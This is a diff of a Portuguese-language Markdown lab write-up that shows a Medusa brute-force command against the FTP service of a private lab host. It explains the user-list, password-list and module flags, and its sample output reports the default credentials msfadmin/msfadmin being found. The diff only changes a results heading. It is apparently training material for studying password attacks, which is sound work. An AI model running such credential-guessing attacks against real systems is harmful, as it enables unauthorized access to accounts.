@@ -171,7 +171,7 @@ medusa -h 192.168.56.110 -U users.txt -P pass.txt -M ftp -v 6
 - `-P`: Arquivo com lista de senhas
 - `-M`: Módulo (ftp no nosso caso)
 
-## **Resultado Esperado:**
+## **Resultado: ✨ SUCCESS ✨**
 
 ```
 ACCOUNT FOUND: [ftp] Host: 192.168.56.110 User: msfadmin Password: msfadmin [SUCCESS]
